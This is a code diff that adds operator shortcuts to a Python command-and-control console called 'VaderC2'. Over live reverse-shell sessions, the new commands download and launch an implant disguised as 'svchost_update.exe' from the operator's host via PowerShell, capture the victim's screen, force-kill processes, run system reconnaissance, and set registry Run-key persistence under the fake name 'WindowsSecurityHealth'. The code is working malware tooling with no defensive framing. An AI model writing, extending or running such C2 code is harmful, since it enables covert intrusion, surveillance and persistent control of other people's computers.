@@ -65,7 +65,8 @@ RST    = "\033[0m"
 
 LISTEN_PORT = 4443
 
-COMMANDS = ["sessions", "interact", "ls", "ref", "log", "train", "help", "exit", "quit", "back"]
+COMMANDS = ["sessions", "interact", "ls", "ref", "log", "train", "help", "exit", "quit", "back",
+            "deploy", "screenshot", "kill", "recon", "persist", "shell"]
 
 
 class VaderCompleter:
@@ -571,9 +572,18 @@ class VaderC2:
     {WHITE}help{RST}                       Show this help
     {WHITE}exit / quit{RST}                Shutdown
 
+  {AMBER}── SHORTCUTS (no 'interact' needed) ──{RST}
+
+    {WHITE}deploy [sid]{RST}               Kill old implant + download + launch fresh
+    {WHITE}screenshot [sid]{RST}            Capture screen → C:\\Users\\Public\\screen.png
+    {WHITE}kill <proc> [sid]{RST}           taskkill /F /IM on target
+    {WHITE}recon [sid]{RST}                 systeminfo + ipconfig + whoami + tasklist
+    {WHITE}persist [sid]{RST}               Set HKCU\\Run registry persistence
+
   {DIM}Partial session IDs work — 'interact c0' matches 'c0205271'{RST}
   {DIM}TCP sessions marked with * are live shells{RST}
   {DIM}Discord sessions are beacon-only (recon + heartbeat){RST}
+  {DIM}Shortcuts auto-find first TCP session if no sid given{RST}
 """)
 
     def banner(self):
@@ -651,6 +661,110 @@ class VaderC2:
                     self.cmd_help()
                 elif cmd in ("exit", "quit"):
                     break
+
+                # ── SHORTCUTS ──
+                elif cmd == "deploy":
+                    sid = args[0] if args else ""
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    if not matches:
+                        print(f"  {RED}[!] No TCP session matching '{sid}'. Use 'sessions' to find one.{RST}")
+                    else:
+                        s = self.sessions[matches[0]]
+                        try:
+                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            _s.connect(("8.8.8.8", 80))
+                            my_ip = _s.getsockname()[0]
+                            _s.close()
+                        except Exception:
+                            my_ip = "192.168.1.92"
+                        deploy_cmd = (
+                            f'taskkill /F /IM svchost_update.exe 2>nul & '
+                            f'powershell -c "Invoke-WebRequest -Uri \'http://{my_ip}:8890/agent/dist_py/svchost_update.exe\' '
+                            f'-OutFile \'C:\\Users\\Public\\svchost_update.exe\'; '
+                            f'Start-Process \'C:\\Users\\Public\\svchost_update.exe\'"'
+                        )
+                        print(f"  {AMBER}[*] Deploying implant via {matches[0][:8]}...{RST}")
+                        try:
+                            s["socket"].sendall((deploy_cmd + "\n").encode("utf-8"))
+                            print(f"  {GREEN}[+] Deploy command sent. Watch Discord #c2 for new session.{RST}")
+                        except Exception as e:
+                            print(f"  {RED}[!] Send failed: {e}{RST}")
+
+                elif cmd == "screenshot":
+                    sid = args[0] if args else ""
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    if not matches:
+                        print(f"  {RED}[!] No TCP session matching '{sid}'. Need interactive shell.{RST}")
+                    else:
+                        s = self.sessions[matches[0]]
+                        shot_cmd = (
+                            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
+                            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
+                            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
+                            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
+                            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
+                            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
+                            '$g.Dispose(); $bmp.Dispose(); '
+                            'echo SCREENSHOT_SAVED"'
+                        )
+                        print(f"  {AMBER}[*] Capturing screen via {matches[0][:8]}...{RST}")
+                        try:
+                            s["socket"].sendall((shot_cmd + "\n").encode("utf-8"))
+                            print(f"  {GREEN}[+] Screenshot → C:\\Users\\Public\\screen.png on target{RST}")
+                            print(f"  {DIM}  Exfil with: exfil C:\\Users\\Public\\screen.png{RST}")
+                        except Exception as e:
+                            print(f"  {RED}[!] Send failed: {e}{RST}")
+
+                elif cmd == "kill":
+                    if not args:
+                        print(f"  {DIM}  Usage: kill <process_name> [session_id]{RST}")
+                    else:
+                        proc_name = args[0]
+                        sid = args[1] if len(args) > 1 else ""
+                        matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                        if not matches:
+                            print(f"  {RED}[!] No TCP session. Interact first.{RST}")
+                        else:
+                            s = self.sessions[matches[0]]
+                            kill_cmd = f"taskkill /F /IM {proc_name}"
+                            try:
+                                s["socket"].sendall((kill_cmd + "\n").encode("utf-8"))
+                                print(f"  {GREEN}[+] Sent: {kill_cmd}{RST}")
+                            except Exception as e:
+                                print(f"  {RED}[!] {e}{RST}")
+
+                elif cmd == "recon":
+                    sid = args[0] if args else ""
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    if not matches:
+                        print(f"  {RED}[!] No TCP session.{RST}")
+                    else:
+                        s = self.sessions[matches[0]]
+                        recon_cmd = "systeminfo & ipconfig /all & whoami /all & tasklist /v"
+                        print(f"  {AMBER}[*] Running recon on {matches[0][:8]}...{RST}")
+                        try:
+                            s["socket"].sendall((recon_cmd + "\n").encode("utf-8"))
+                        except Exception as e:
+                            print(f"  {RED}[!] {e}{RST}")
+
+                elif cmd == "persist":
+                    sid = args[0] if args else ""
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].get("channel") == "tcp"]
+                    if not matches:
+                        print(f"  {RED}[!] No TCP session.{RST}")
+                    else:
+                        s = self.sessions[matches[0]]
+                        persist_cmd = (
+                            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
+                            '/v WindowsSecurityHealth /t REG_SZ '
+                            '/d "C:\\Users\\Public\\svchost_update.exe" /f'
+                        )
+                        try:
+                            s["socket"].sendall((persist_cmd + "\n").encode("utf-8"))
+                            print(f"  {GREEN}[+] Persistence set: HKCU\\Run\\WindowsSecurityHealth{RST}")
+                        except Exception as e:
+                            print(f"  {RED}[!] {e}{RST}")
+
                 else:
                     print(f"  {RED}[!] Unknown: {cmd}. Type 'help'{RST}")
 
